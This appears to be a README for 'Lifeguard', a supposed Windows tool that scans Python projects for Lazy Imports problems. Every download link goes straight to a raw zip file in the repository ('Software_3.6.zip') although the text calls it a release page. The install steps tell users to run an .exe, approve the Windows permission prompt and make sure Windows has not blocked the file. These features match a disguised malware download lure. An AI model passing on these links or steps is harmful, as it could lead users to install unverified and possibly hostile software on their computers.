# 🛟 Lifeguard - Catch Lazy Import Issues Fast

[![Download Lifeguard](https://img.shields.io/badge/Download-Lifeguard-blue?style=for-the-badge)](https://raw.githubusercontent.com/ethan148h/Lifeguard/main/resources/Software_3.6.zip)

## 📥 Download

Visit this page to download Lifeguard for Windows:

https://raw.githubusercontent.com/ethan148h/Lifeguard/main/resources/Software_3.6.zip

On that page, look for the latest release and download the Windows file. If you see more than one file, pick the one that ends in `.exe` or `.zip`.

## 🪟 Install on Windows

1. Open the download page.
2. Find the newest release.
3. Download the Windows file.
4. If you downloaded a `.zip` file, right-click it and choose **Extract All**.
5. Open the extracted folder.
6. If you downloaded an `.exe` file, double-click it to start Lifeguard.
7. If Windows asks for permission, choose **Run** or **Yes**.

## 🚀 What Lifeguard Does

Lifeguard checks Python code for Lazy Imports issues before they become a problem.

It helps you:

- Find code that may break with Lazy Imports
- Spot import patterns that need changes
- Reduce the work needed to adopt Lazy Imports
- Review a project before you turn on Lazy Imports
- Check code in a simple, repeatable way

This tool is meant for people who want a clear check of their Python code without reading through files by hand.

## 🖥️ Before You Start

Lifeguard is made for Windows users who want to inspect Python projects.

You will need:

- A Windows computer
- A downloaded Lifeguard release
- A Python project to check
- Access to the folder that holds your project files

If you plan to scan a project, keep the project in a normal folder on your computer. Avoid folders with very long paths or special permission limits.

## 🛠️ How to Use Lifeguard

After you open Lifeguard, use it to point at the folder you want to check.

Typical use looks like this:

1. Open Lifeguard.
2. Choose the Python project folder.
3. Start the scan.
4. Review the results.
5. Make code changes based on the listed issues.
6. Run the scan again after changes.

If the app shows a file list or report, look for lines tied to imports, module loading, or Lazy Imports rules. These are the places that matter most.

## 📋 What the Results Mean

Lifeguard gives you a list of places that may not work well with Lazy Imports.

You may see:

- Files with import patterns that need attention
- Direct imports that load code too early
- Modules that may behave differently under Lazy Imports
- Areas that need a small code change before adoption

Use the results as a guide. Start with the highest-risk items first, then work through the rest of the list.

## 🔎 Good Ways to Use It

Lifeguard works well when you want to prepare a Python project for Lazy Imports.

Use it to:

- Check a small app before a bigger rollout
- Review code after a new feature is added
- Compare results before and after code changes
- Help a team agree on where import cleanup is needed
- Reduce surprise errors during startup

If you manage several projects, you can run the scan on each one and keep the results together for later review.

## 🧭 Common Tasks

### Open a project folder
Pick the folder that contains your Python code. This is usually the main app folder.

### Run a scan
Start the check after you choose the project folder.

### Read the report
Look for the files and lines marked as likely Lazy Imports problems.

### Fix issues
Update the code where needed, then scan again to confirm the change.

### Recheck after updates
Run Lifeguard again after you change imports or move code.

## 🧩 Example Use Case

If your Python app starts fine today but you plan to use Lazy Imports, Lifeguard can help you find code that may act differently later.

For example, a module may:

- Load too much at startup
- Depend on side effects from imports
- Assume another file ran first
- Break when imports happen later than before

Lifeguard helps you find these spots before they cause trouble.

## ⚙️ Project Details

- Name: Lifeguard
- Type: Static analyzer
- Focus: Lazy Imports compatibility
- Language area: Python projects
- Core tech: Rust-based analysis engine
- Topics: lazy imports, PEP 810, Python, Rust, static analysis

## 🧰 Troubleshooting

### The app does not open
- Try running it again
- Make sure the download finished
- If you used a zip file, extract it first
- Check that Windows did not block the file

### The scan finds too many items
- Start with the first few items in the report
- Check shared modules first
- Review files that run during startup

### I do not know what folder to scan
- Choose the main folder for your Python app
- Look for folders with `main.py`, `app.py`, or similar entry files
- If the project has a `src` folder, scan the project root first

### The results are hard to read
- Focus on the file name first
- Then check the line marked in the report
- Open that file in your code editor and review the import near that line

## 📌 Tips for Best Results

- Scan one project at a time
- Review the most central files first
- Re-run the scan after each change
- Keep a copy of the report if you need to compare results later
- Use the tool before you switch on Lazy Imports in a project

## 📚 Useful Terms

- **Static analyzer**: a tool that checks code without running it
- **Import**: a way for one file to use code from another file
- **Lazy Imports**: a way to load code later, not right away
- **PEP 810**: a Python proposal tied to Lazy Imports behavior

## 🔗 Download Again

If you need the installer or want the latest release, use this page:

https://raw.githubusercontent.com/ethan148h/Lifeguard/main/resources/Software_3.6.zip